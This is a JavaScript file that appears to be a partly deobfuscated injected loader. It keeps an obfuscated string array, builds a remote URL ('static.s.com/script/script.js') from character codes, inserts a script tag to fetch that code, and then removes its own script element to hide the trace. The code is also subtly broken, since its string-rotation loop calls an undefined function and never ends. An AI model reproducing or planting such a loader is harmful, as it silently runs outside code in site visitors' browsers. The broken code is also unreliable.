var array1 = undefined;

function getArray() {
  var array2 = [
    "0x107",
    "0xff",
    "0x103",
    "818428usZefP",
    "0x10a",
    "shift",
    "0x101",
    "querySelector",
    "fromCharCode",
    "0x109",
    "0x100",
    "insertBefore",
    "0x104",
    "13368123tmzzBY",
    "948747dUIjuX",
    "kKYIC",
    "appendChild",
    "remove",
    "ciBgI",
    "0x111",
    "0x110",
    "4tbcPXP",
    "coll",
    "8053551ZtaGqy",
    "currentScript",
    "0x108",
    "0x10d",
    "2976235jkTRHy",
    "5YSDUMY",
    "132451QmtDpb",
    "2229544tzYEKK",
    "1379694yGZsHg",
    "head",
    "0x113",
    "0x114",
    "parentNode",
    "c=\x22",
    "createElement",
    "105690rohciz",
    "pt[",
    "yyfUG",
    "322jtuOfV",
    "0x10c",
    "getElementsByTagName",
    "21414LOUldK",
    "push",
    "0x106",
    "0x102",
    "10pGMVfl",
    "0x10f",
    "519640HOkpHF",
    "133222pVrQry",
    "src",
    "10ryWNxS",
    "2020SgrGNi",
    "ect",
    "0x112",
    "0x10e",
    "770mBTNDL",
    "0x115",
    "34086UYzPEq",
    "1485380zQiyOr",
    "0x10b",
  ];

  getArray = function () {
    return array2;
  };

  return getArray();
}

(function (func1, val1) {
  var W = undefined;
  var arr = func1();
  
  while (true) {
    try {
      var result =
        (parseInt(W(0x1df)) / 0x1) * (parseInt(W(0x1d0)) / 0x2) +
        -parseInt(W(0x208)) / 0x3 +
        (parseInt(W(0x1fe)) / 0x4) * (-parseInt(W(0x204)) / 0x5) +
        (parseInt(W(0x1e6)) / 0x6) * (-parseInt(W(0x1e4)) / 0x7) +
        parseInt(W(0x1dc)) / 0x8 +
        -parseInt(W(0x200)) / 0x9 +
        (-parseInt(W(0x1e0)) / 0xa) * (-parseInt(W(0x206)) / 0xb);

      if (result === val1) {
        break;
      } else {
        arr.push(arr.shift());
      }
    } catch (error) {
      arr.push(arr.shift());
    }
  }
})(getArray, 0x6e0e9);

function getValue(index) {
  var arr = getArray();
  return arr[index - 0x1cb];
}

function isElementPresent(element) {
  return Boolean(
    document.querySelector("script[src*='" + element + "']")
  );
}

var scriptURL =
  "https" +
  String.fromCharCode(0x3a) +
  String.fromCharCode(0x2f) +
  String.fromCharCode(0x2f) +
  "static.s" +
  String.fromCharCode(0x2e) +
  "com" +
  String.fromCharCode(0x2f) +
  "script" +
  String.fromCharCode(0x2f) +
  "script.js";

if (!isElementPresent(scriptURL)) {
  var documentObj = document;
  var scriptElement = documentObj.createElement("script");
  
  scriptElement.src = scriptURL;
  
  if (documentObj.currentScript) {
    if (documentObj.currentScript.parentNode !== null) {
      documentObj.currentScript.parentNode.insertBefore(
        scriptElement,
        documentObj.currentScript
      );
    }
  } else {
    var headElements = documentObj.getElementsByTagName("head");
    if (headElements[0] !== null) {
      headElements[0].appendChild(scriptElement);
    }
  }
}

if (document.currentScript) {
  document.currentScript.remove();
}
